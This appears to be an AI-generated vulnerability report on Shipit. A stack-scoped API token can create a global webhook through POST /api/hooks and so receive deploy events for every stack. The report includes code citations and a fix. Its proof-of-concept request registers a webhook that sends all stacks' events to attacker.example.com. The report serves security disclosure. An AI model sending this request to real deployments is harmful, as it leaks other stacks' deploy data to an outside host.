## Analysis

I traced the bug-class hint (a verified credential that binds to one identifier but a critical resource-scope field being silently unenforced, allowing an unprivileged replay/escalation) to the `ApiClient` stack-scoping model in this engine, and found a concrete, reachable analog.

### Title
Stack-scoped API token can create global webhooks that leak deploy state across all stacks - (File: `app/controllers/shipit/api/hooks_controller.rb`)

### Summary
An `ApiClient` can be provisioned with a `stack_id`, which is intended to restrict it to interacting with a single `Stack`. The `write:hook` permission, however, is a global (non-stack-scoped) permission string, and the top-level `/api/hooks` route is not stack-scoped. A token holder authorized only for one stack can therefore register a global `Hook` (`stack_id: nil`) that receives delivery of events (`deploy`, `rollback`, `lock`, `commit_status`, `merge`, `pull_request`, etc.) for **every** stack in the Shipit instance, not just the one the token is bound to.

### Finding Description
`ApiClient` restricts the set of stacks it can act on via `stack_id`: `Shipit::Api::BaseController#stacks` returns only the client's own stack when `current_api_client.stack_id?` is true. [1](#0-0) 

Permission checks are enforced separately and are not stack-aware — they only check a flat string like `write:hook` against the `permissions` array. [2](#0-1) 

`config/routes.rb` exposes both a stack-scoped hooks resource (`/api/stacks/*stack_id/hooks`) and an unscoped, global one (`/api/hooks`), both hitting the same `HooksController`. [3](#0-2) 

`HooksController#create` computes `stack_id` purely from `params[:stack_id].present?`; when the client hits the global route, `params[:stack_id]` is absent, so `stack_id` is `nil` and the created `Hook` is global (`Hook.where(stack_id: nil)` / `Hook.global`), with no verification that the acting `ApiClient` isn't restricted to a specific stack: [4](#0-3) 

Global hooks receive delivery for events across **all** stacks: [5](#0-4) 

confirmed by test behavior showing the unscoped route returns/affects the global hook set: [6](#0-5) 

The binding that should hold is: **stack a token authorizes == stack a token can touch**. Before the attacker's request, the client's `stack_id` binds it to Stack A only via `stacks`/`stack` helpers used by every *other* stack-scoped controller. After a `POST /api/hooks` (global route) with only `write:hook` permission, the same token creates a `Hook` with `stack_id: nil`, which is delivered events from Stack A, B, C, … — breaking the equality and giving the token owner visibility (via their own configured `delivery_url`) into deploy/rollback/lock/commit_status/merge events belonging to stacks they were never granted access to.

### Impact Explanation
This grants a token holder who is authorized only for one stack the ability to receive deploy, rollback, lock, and merge status information for every other stack managed by the Shipit instance, by exfiltrating that data to a delivery URL they control. This matches the "unauthenticated/unauthorized read of stack state, task streams, or deploy output" High-impact category — here achieved by a token whose privileges were meant to be limited to a single stack, escalating to instance-wide read visibility of task/deploy state via webhook deliveries.

### Likelihood Explanation
Any legitimate `ApiClient` created with `stack_id` set and the `write:hook` permission (a normal, plausible provisioning combination for a "stack-scoped integration that wants to notify on its own deploys") can trivially exploit this — it is a single unauthenticated-by-authorization `POST /api/hooks` request, requiring no additional privilege beyond what the client already legitimately holds.

### Recommendation
Enforce stack scoping consistently for hook creation: reject (or force-scope) hook creation to `current_api_client.stack` when the `ApiClient` is stack-scoped (`current_api_client.stack_id?`), regardless of whether the request hits the global or stack-nested route, e.g. in `HooksController#hooks`/`#create`, raise `ApiClient::InsufficientPermission` (or 403) if `current_api_client.stack_id?` is true and the target `stack_id` doesn't match `current_api_client.stack_id`.

### Proof of Concept
1. Provision (or obtain) an `ApiClient` with `stack_id` set to Stack A and permissions `['write:hook']` (a plausible, narrowly-scoped integration token).
2. Authenticate as that client and send:
   ```
   POST /api/hooks
   Authorization: Basic <token>
   { "delivery_url": "https://attacker.example.com/collect", "events": ["deploy","rollback","lock","merge","commit_status"] }
   ```
   Note: no `stack_id` param — this hits the global, unscoped `resources :hooks` route in `config/routes.rb` line 46.
3. `HooksController#create` computes `stack_id` as `nil` (since `params[:stack_id]` is absent) and persists a global `Hook`.
4. `Hook.deliver`/`Hook.emit` will now dispatch events for deploys, rollbacks, locks, and merges on **every** stack in the instance to `https://attacker.example.com/collect`, even though the token was only ever authorized (via `stack_id`) for Stack A.

Note: I was unable to inspect the `app/views/shipit/api_clients/*` templates in full (only file paths were resolved, not full contents, likely due to index size limits) to confirm whether the admin UI itself discourages or prevents assigning `write:hook` to stack-scoped clients; if you need to verify the exact provisioning UX, a Devin session with full repo access would be needed to check those views directly.

### Citations

**File:** app/controllers/shipit/api/base_controller.rb (L74-80)
```ruby
      def stacks
        @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
      end

      def stack
        @stack ||= stacks.from_param!(params[:stack_id])
      end
```

**File:** app/models/shipit/api_client.rb (L38-45)
```ruby
    def check_permissions!(operation, scope)
      required_permission = "#{operation}:#{scope}"
      unless permissions.include?(required_permission)
        raise InsufficientPermission, "This operation requires the `#{required_permission}` permission"
      end

      true
    end
```

**File:** config/routes.rb (L43-46)
```ruby
      resources :hooks, only: %i[index create show update destroy]
    end

    resources :hooks, only: %i[index create show update destroy]
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L17-52)
```ruby
      params do
        requires :delivery_url, String
        requires :events, Array[String]
        accepts :content_type, String
      end
      def create
        render_resource(hooks.create(params))
      end

      params do
        accepts :delivery_url, String
        accepts :events, Array[String]
        accepts :content_type, String
      end
      def update
        hook.update(params)
        render_resource(hook)
      end

      def destroy
        render_resource(hook.destroy)
      end

      private

      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
```

**File:** app/models/shipit/hook.rb (L93-119)
```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```

**File:** test/controllers/api/hooks_controller_test.rb (L17-26)
```ruby
      test "#index without a stack_id returns the list of global hooks" do
        hook = Hook.global.first

        get :index
        assert_response :ok
        assert_json '0.id', hook.id
        assert_json '0.delivery_url', hook.delivery_url
        assert_json '0.content_type', hook.content_type
        assert_no_json '0.stack'
      end
```
